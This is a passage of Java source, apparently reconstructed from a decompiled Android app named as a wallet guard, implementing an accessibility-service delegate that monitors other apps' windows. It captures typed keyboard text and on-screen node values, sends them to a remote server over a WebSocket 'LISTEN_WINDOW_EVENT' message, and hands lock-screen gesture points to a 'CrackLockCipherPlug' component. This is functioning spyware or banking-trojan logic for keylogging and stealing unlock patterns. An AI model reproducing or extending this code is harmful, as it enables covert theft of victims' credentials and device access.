                // tree search 返回空。参考 android 项目 OppoEngine: 当 package/class 已匹配时
                // 跳过 matchs 验证，由后续业务方法 (k0/l0/j0) 自行验证 UI 内容。
                boolean matchResult = true;
                if (listenWindow.getMatchs() != null && !listenWindow.getMatchs().isEmpty()) {
                    for (CombineFilter combineFilter : (List<CombineFilter>) listenWindow.getMatchs()) {
                        if (!t(combineFilter, (UiObject) atomicReference.get())) {
                            matchResult = false;
                            break;
                        }
                    }
                }
                // Check dismiss
                if (matchResult && listenWindow.getDismiss() != null && !listenWindow.getDismiss().isEmpty()) {
                    for (CombineFilter combineFilter2 : (List<CombineFilter>) listenWindow.getDismiss()) {
                        if (t(combineFilter2, (UiObject) atomicReference.get())) {
                            matchResult = false;
                            break;
                        }
                    }
                }
                if (matchResult) {
                    return true;
                }
            }
        } catch (Exception e2) {
            AppUtils.s("matchListenWindow 1:", e2);
        }
        return false;
    }

    /**
     * vendor r(EventSubscribe, UiObject) — 搜索 EventSubscribe 的节点。
     * 使用静态 s() 从事件源和 activeRoot 查找节点。
     * sourceRule 0/1: 先试事件源，失败则回退到 activeRoot。
     * sourceRule 2: 始终搜索 activeRoot (addAll)。
     */
    public final ArrayList r(EventSubscribe eventSubscribe, UiObject uiObject) {
        ArrayList arrayList = new ArrayList();
        try {
            if (eventSubscribe.getSelector() != null) {
                if (uiObject != null) {
                    LinkedList s4 = s(eventSubscribe, uiObject);
                    if (s4 != null && !s4.isEmpty()) {
                        arrayList.addAll(s4);
                    }
                }
                AtomicReference atomicReference = this.h;
                if (atomicReference.get() != null) {
                    if (arrayList.isEmpty() && (Objects.equals(eventSubscribe.getSourceRule(), 0) || Objects.equals(eventSubscribe.getSourceRule(), 1))) {
                        LinkedList s3 = s(eventSubscribe, (UiObject) atomicReference.get());
                        if (s3 != null && !s3.isEmpty()) {
                            arrayList.addAll(s3);
                        }
                    }
                    if (Objects.equals(eventSubscribe.getSourceRule(), 2)) {
                        LinkedList s2 = s(eventSubscribe, (UiObject) atomicReference.get());
                        if (s2 != null && !s2.isEmpty()) {
                            arrayList.addAll(s2);
                        }
                    }
                }
            }
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
        }
        return arrayList;
    }

    /**
     * vendor t(CombineFilter, UiObject) — 带重试的 CombineFilter 与 UiObject 匹配。
     * 将 filter 转换为 GKD selector 字符串，最多尝试 repeatCount 次，间隔 2 tick。
     */
    public final boolean t(CombineFilter combineFilter, UiObject uiObject) {
        if (uiObject != null && combineFilter != null) {
            try {
                String gkdSelector = com.guard.wallet.gkd.CombineFilterConverter.toGkdSelector(combineFilter);
                if (gkdSelector == null || gkdSelector.isEmpty()) {
                    return false;
                }
                int i2 = 0;
                while (true) {
                    if (i2 > combineFilter.getRepeatCount().intValue()) {
                        break;
                    }
                    if (com.guard.wallet.gkd.GkdNodeFinder.findOne(uiObject, gkdSelector) != null) {
                        return true;
                    }
                    if (i2 >= combineFilter.getRepeatCount().intValue()) {
                        return false;
                    }
                    com.guard.wallet.utils.SystemHelper.T0(2);
                    i2++;
                }
            } catch (Exception e2) {
                AppUtils.s("AccessibilityDelegate:matchWindowFromParent", e2);
            }
        }
        return false;
    }

    /**
     * vendor u(AccessibilityEvent, String packageName, String className) — 处理无障碍事件。
     * 从事件源创建根 UiObject，包装为 j0，通过线程池分发。
     */
    public void u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        if (accessibilityEvent != null) {
            try {
                if (o()) {
                    UiObject createRoot = UiObject.createRoot(accessibilityEvent.getSource(), true);
                    String str3 = this.c;
                    if (createRoot != null) {
                        createRoot.setUniqueId(str3);
                    }
                    String beforeText = (accessibilityEvent.getEventType() == 16 && accessibilityEvent.getBeforeText() != null)
                            ? accessibilityEvent.getBeforeText().toString()
                            : null;
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.DelegateEventDispatcher(this, new ListenWindowState(createRoot, accessibilityEvent.getEventType(), str, str2, beforeText), 0), str3);
                }
            } catch (Exception e2) {
                AppUtils.s("AccessibilityDelegate:onAccessibilityEvent", e2);
            }
        }
    }

    /**
     * vendor v(UiObject, boolean rootReady, String packageName, String className, String windowTitle)
     * — 更新 activeRoot 和当前窗口信息。
     * 若 root 变更则回收旧 root、清空 nodeCache。
     * 若 rootReady 为 false，在线程池上分发 DelegateTaskRunner(1, this)。
     */
    public final void v(UiObject uiObject, boolean z2, String str, String str2, String str3) {
        AtomicReference atomicReference = this.h;
        try {
            if (!Objects.equals(uiObject, atomicReference.get())) {
                if (atomicReference.get() != null) {
                    Log.d("AccessibilityDelegate", "delegate activeRoot recycle");
                    ((UiObject) atomicReference.get()).recycle();
                }
                this.m.clear();
                Log.d("AccessibilityDelegate", "delegate activeRoot \u5DF2\u66F4\u6539");
            }
            String str4 = this.c;
            if (uiObject != null) {
                uiObject.setUniqueId(str4);
            }
            atomicReference.set(uiObject);
            AtomicBoolean atomicBoolean = this.i;
            atomicBoolean.set(z2);
            this.j.set(str);
            this.k.set(str2);
            this.l.set(str3);
            if (atomicBoolean.get()) {
                return;
            }
            com.guard.wallet.thread.DelegateTaskLauncher.c(new DelegateTaskRunner(1, this), str4);
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
        }
    }

    /**
     * vendor w(boolean) — 更新事件计数器。
     * true: 重置为 0（活跃）。false: 增 1（陈旧追踪）。
     */
    public final void w(boolean z2) {
        AtomicInteger atomicInteger = this.g;
        try {
            if (z2) {
                atomicInteger.set(0);
            } else {
                this.h.get();
                atomicInteger.set(atomicInteger.get() + 1);
            }
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
        }
    }

    /**
     * vendor x(EventSubscribe, ArrayList, String beforeText, String eventText, Long batchId)
     * — 收集并上报监听属性响应。
     * 遍历匹配节点的 listenProps，收集属性值，
     * 通过 WebSocket 以 LISTEN_WINDOW_EVENT 发送。特殊处理 "text" 属性。
     */
    public final void x(EventSubscribe eventSubscribe, ArrayList nodeList, String beforeText, String eventText, Long batchId) {
        ConcurrentHashMap subscribeMap = this.f;
        if (eventSubscribe.getListenProps() == null || eventSubscribe.getListenProps().isEmpty()) {
            return;
        }
        LinkedList responses = new LinkedList();
        try {
            if (!nodeList.isEmpty()) {
                int nodeIndex = 0;
                Iterator nodeIt = nodeList.iterator();
                while (nodeIt.hasNext()) {
                    UiObject uiObject = (UiObject) nodeIt.next();
                    Iterator propIt = eventSubscribe.getListenProps().iterator();
                    while (propIt.hasNext()) {
                        String prop = (String) propIt.next();
                        if (AppUtils.B(prop) || Objects.equals(prop, "GESTURE_POINTS") || Objects.equals(prop, "TOUCH_POINT")) {
                            continue;
                        }
                        // Handle "text" prop with beforeText
                        if (Objects.equals(prop, "text") && !AppUtils.B(beforeText)) {
                            Log.d("AccessibilityDelegate", "\u76D1\u542C\u5230\u524D\u7F6E\u5C5E\u6027:" + prop + ":" + beforeText);
                            String sanitized = beforeText.replaceAll("\u2022", "*");
                            responses.add(new ListenPropResponse(nodeIndex, prop, sanitized, eventSubscribe.getEventTimestamp()));
                        }
                        // Handle "text" prop with eventText (keyboard input)
                        if (Objects.equals(prop, "text") && !AppUtils.B(eventText)) {
                            Log.d("AccessibilityDelegate", "\u76D1\u542C\u5230\u952E\u76D8\u5C5E\u6027:" + prop + ":" + eventText);
                            String sanitized = eventText.replaceAll("\u2022", "*");
                            responses.add(new ListenPropResponse(nodeIndex, prop, sanitized, eventSubscribe.getEventTimestamp()));
                        }
                        // Get property value from node
                        String value = uiObject.getProperty(prop);
                        if (!AppUtils.B(value)) {
                            Log.d("AccessibilityDelegate", "\u76D1\u542C\u5230\u5C5E\u6027:" + prop + ":" + value);
                            String sanitized = value.replaceAll("\u2022", "*");
                            responses.add(new ListenPropResponse(nodeIndex, prop, sanitized, eventSubscribe.getEventTimestamp()));
                        }
                    }
                    nodeIndex++;
                }
            }
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate:postListenProps", e2);
        }

        try {
            if (responses.isEmpty()) {
                return;
            }
            // For non-lock listen types (not 0, 1, 8, 9), track subscribe in map
            if (!Objects.equals(eventSubscribe.getListenType(), 0)
                    && !Objects.equals(eventSubscribe.getListenType(), 1)
                    && !Objects.equals(eventSubscribe.getListenType(), 8)
                    && !Objects.equals(eventSubscribe.getListenType(), 9)) {
                String subId = eventSubscribe.getId();
                boolean alreadyTracked;
                try {
                    alreadyTracked = !AppUtils.B(subId) && subscribeMap.containsKey(subId);
                } catch (Exception ex) {
                    AppUtils.s("AccessibilityDelegate", ex);
                    alreadyTracked = false;
                }
                if (!alreadyTracked) {
                    try {
                        String subId2 = eventSubscribe.getId();
                        if (!AppUtils.B(subId2) && !subscribeMap.containsKey(subId2)) {
                            subscribeMap.put(subId2, System.currentTimeMillis());
                        }
                    } catch (Exception ex) {
                        AppUtils.s("AccessibilityDelegate", ex);
                    }
                }
            }

            // For listenType 8/9, handle needReply
            boolean shouldSend;
            if (Objects.equals(eventSubscribe.getListenType(), 8) || Objects.equals(eventSubscribe.getListenType(), 9)) {
                shouldSend = eventSubscribe.isNeedReply();
                if (shouldSend) {
                    Log.d("AccessibilityDelegate", "postListenProps \u6709\u9700\u8981\u54CD\u5E94\u7684\u524D\u7F6E\u8BA2\u9605,\u9700\u8981\u4E0A\u4F20\u76D1\u542C\u7ED3\u679C" + eventSubscribe.getListenProps().toString());
                    this.z(eventSubscribe);
                }
            } else {
                shouldSend = true;
            }

            // Build and send listen response
            ListenResponseVO listenResponseVO = new ListenResponseVO();
            listenResponseVO.setBatchId(String.valueOf(batchId));
            listenResponseVO.setSubscribeId(eventSubscribe.getId());
            listenResponseVO.setListenId(eventSubscribe.getListenId());
            listenResponseVO.setDelegateId(this.c);
            listenResponseVO.setResponses(responses);
            MessageRecordVO messageRecordVO = new MessageRecordVO();
            messageRecordVO.setExtraBody(listenResponseVO);
            messageRecordVO.setIntentCode("android.accessibility.delegate.LISTEN_WINDOW_EVENT");
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
                if (shouldSend) {
                    MainApplication.getInstance().getHandlerMsgAndTimer().a(messageRecordVO);
                }
            }

            // For lock listenType with empty/GESTURE_POINTS helperProp, forward to crackLockCipherPlug
            if (Objects.equals(eventSubscribe.getListenType(), 1)
                    && (AppUtils.B(eventSubscribe.getHelperProp()) || Objects.equals(eventSubscribe.getHelperProp(), "GESTURE_POINTS"))) {
                if (MainApplication.getInstance() != null && MainApplication.getInstance().getCrackLockCipherPlug() != null) {
                    MainApplication.getInstance().getCrackLockCipherPlug().getClass();
                    com.guard.wallet.plug.CrackLockCipherPlug.cacheListenResponse(listenResponseVO);
                }
            }
        } catch (Exception e2) {
            AppUtils.s("AccessibilityDelegate", e2);
        }
    }

    /**
     * vendor y(int target, String resUnique) — 获取刷新后的节点并转为 SearchNodeResultVO。
     * 通过 m() 获取节点、刷新、重新缓存并返回 VO。
     */
    public final SearchNodeResultVO y(int i2, String str) {
        if (i2 < 0) {
            i2 = 0;
        }
        try {
            UiObject m2 = m(i2, str);
            if (m2 != null) {
                m2.refresh();
                try {
                    if (AppUtils.B(str)) {
                        str = String.valueOf(this.b.nextId());
                    }
                    this.m.put(str, m2);
                    return new SearchNodeResultVO(str, new UiObjectVO(m2));
                } catch (Exception e2) {
                    AppUtils.s("AccessibilityDelegate", e2);
                    return null;
                }
            }
        } catch (Exception e3) {
            AppUtils.s("AccessibilityDelegate", e3);
        }
        return null;
    }

    /**
     * vendor z(EventSubscribe) — 从跟踪映射中移除回复订阅。
     * 对每个 replySubscribe ID，从 f (replySubscribeMap) 中移除。
     */
    public final void z(EventSubscribe eventSubscribe) {
        try {
            if (eventSubscribe.getReplySubscribes() == null || eventSubscribe.getReplySubscribes().isEmpty()) {
                return;
            }
            for (String str : (List<String>) eventSubscribe.getReplySubscribes()) {
                try {
                    if (!AppUtils.B(str)) {
                        this.f.remove(str);
                    }
                } catch (Exception e2) {
                    AppUtils.s("AccessibilityDelegate", e2);
                }
            }
        } catch (Exception e3) {
            AppUtils.s("AccessibilityDelegate", e3);
        }
    }

    // ═══════ Inner class ═══════

    /**
     * vendor e.a — 委托线程池操作的 Runnable 回调（遗留内部类）。
     * 被 {@link DelegateTaskRunner} 取代 — 保留供参考。
     * type 1 = 根更新后处理监听窗口（从 v() 调用）。
     */
    public static class a implements Runnable {
        public final int a;
        public final Object b;

        public a(Object delegate, int type) {
            this.a = type;
            this.b = delegate;
        }

        @Override
        public void run() {
            switch (this.a) {
                case 1:
                    try {
                        ((AccessibilityDelegate) this.b).G();
                    } catch (Exception ex) {
                        AppUtils.s("AccessibilityDelegate", ex);
                    }
                    return;
                case 2:
                    try {
                        ((EnableSecureDelegate) this.b).I(false);
                    } catch (Exception ex) {
                        AppUtils.s("EnableSecureDelegate", ex);
                    }
                    return;
                default:
                    return;
            }
        }
    }
}
